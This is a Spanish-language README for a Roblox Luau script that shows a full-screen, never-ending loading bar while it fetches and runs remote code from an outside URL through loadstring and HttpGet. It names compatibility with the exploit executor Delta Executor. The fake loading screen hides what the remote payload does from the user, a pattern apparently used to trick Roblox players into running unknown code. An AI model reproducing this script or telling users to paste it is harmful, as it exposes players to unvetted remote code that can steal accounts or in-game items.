# Pantalla de Carga Infinita para Roblox con Ejecución de Script Externo

Este script de Luau crea una pantalla de carga que ocupa toda la pantalla en Roblox y muestra el mensaje "El script se está cargando...". La barra de carga está diseñada para no terminar nunca, simulando un proceso de carga continuo. Además, este script integra la ejecución de un script externo a través de `loadstring(game:HttpGet("URL_DEL_SCRIPT"))()`.

## Características
- **Compatibilidad:** Diseñado para ejecutarse en Roblox (Luau) y compatible con ejecutores como Delta Executor.
- **Pantalla Completa:** Ocupa el 100% del ancho y alto de la pantalla, ignorando el inset de la GUI de Roblox.
- **Mensaje Personalizable:** Muestra "El script se está cargando..." con texto escalable.
- **Barra de Carga Infinita:** Incluye una barra de progreso animada que se mueve de forma continua, sin alcanzar nunca el 100%.
- **Ejecución de Script Externo:** Incluye la línea `loadstring(game:HttpGet("https://hesiz.com/api/iepONhug/raw"))()` para cargar y ejecutar un script externo mientras la pantalla de carga está activa.

## Cómo usar
1. Copia el contenido del archivo `LoadingScreen.lua`.
2. En Roblox Studio, abre tu juego.
3. En el explorador, navega a `StarterPlayer` -> `StarterPlayerScripts`.
4. Inserta un nuevo `LocalScript` y pega el código dentro.
5. Ejecuta el juego para ver la pantalla de carga y la ejecución del script externo.

**Consideraciones Importantes:**
- La pantalla de carga permanecerá visible indefinidamente, ya que la barra de carga es infinita. Si el script externo necesita que la pantalla de carga desaparezca, deberás añadir lógica para destruir el `ScreenGui` (`screenGui:Destroy()`) en el script principal o en el script externo.
- Asegúrate de que el script externo (`https://hesiz.com/api/iepONhug/raw`) sea seguro y de confianza, ya que se ejecutará directamente en tu entorno de Roblox.
- La compatibilidad con Delta Executor se basa en el uso estándar de `game:HttpGet` y `loadstring`, que son funciones comunes en la mayoría de los ejecutores de Roblox.
